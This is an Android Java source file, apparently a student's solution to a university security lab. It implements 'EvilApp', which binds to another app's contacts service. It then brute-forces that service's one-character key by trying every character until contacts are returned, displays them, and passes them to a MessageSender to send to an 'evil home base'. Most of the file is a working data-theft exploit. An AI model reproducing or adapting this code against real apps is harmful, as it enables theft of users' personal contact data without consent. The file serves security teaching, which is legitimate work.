package com.cs155.evilapp;

import com.cs155.evilapp.R;
import com.cs155.trustedapp.IGetContactsString;

import android.os.Bundle;
import android.os.IBinder;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.ServiceConnection;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.TextView;


public class MainActivity_no_key extends Activity {
	
    @Override
    protected void onCreate(Bundle savedInstanceState) {
	super.onCreate(savedInstanceState);
	setContentView(R.layout.activity_main);
		
	Button button = (Button) findViewById(R.id.btn_steal_contacts);

	OnClickListener listen = new OnClickListener() {
		public void onClick(View v) {
		    // The following line shows how to use the Log library. 
		    Log.v(getClass().getSimpleName(), "Got a click of steal contacts button!");
				
		    // TODO: Steal the contacts from TrustedApp
		    stealContacts();
		}
	    };
	
	button.setOnClickListener(listen);		
    }

    /* Use this method to display the contacts in the EvilApp GUI */
    private void showContacts(String contacts) {
	TextView contactView = (TextView) findViewById(R.id.text_view_contacts);
	contactView.setText("Contacts:\n" + contacts);
	
	// Send the contacts to your evil home base
	// Please do not remove this call
	MessageSender m = new MessageSender();
	m.SendMessage(contacts);
    }


    private void stealContacts() {
	// TODO: your implementation here
    	this.bindService(new Intent("com.cs155.trustedapp.ReadContactsService"), mConnection, BIND_AUTO_CREATE);
    }
    
    ServiceConnection mConnection = new ServiceConnection() {
    	public void onServiceDisconnected(ComponentName name) {
//    		Toast.makeText(Client.this, "Service is disconnected", 1000).show();
//    		mBounded = false;
//    		mServer = null;
    	}
    	  
    	public void onServiceConnected(ComponentName name, IBinder service) {
//    		System.out.println("Here I am now!");
//    		
    		try {
    			IGetContactsString ser = IGetContactsString.Stub.asInterface((IBinder)service);
    			for (int i = Character.MIN_VALUE; i < Character.MAX_VALUE; i++) {
    		        
    				String c = Character.toString((char) i);
    				System.out.println("Trying char " + c);
    				String contacts = ser.GetContacts(c);
    				System.out.println("Response was: "+contacts);
    		        if (!contacts.equals("")){
    		        	showContacts(contacts);
    		        	System.out.println("Success!");
    		        	break;
    		        }
    		    }
    		}
    		catch (Exception e){
    			System.out.println(e);	
    		}
//    		Toast.makeText(Client.this, "Service is connected", 1000).show();
//    		mBounded = true;
//    		LocalBinder mLocalBinder = (LocalBinder)service;
//    		mServer = mLocalBinder.getServerInstance();
    	}
   };
}
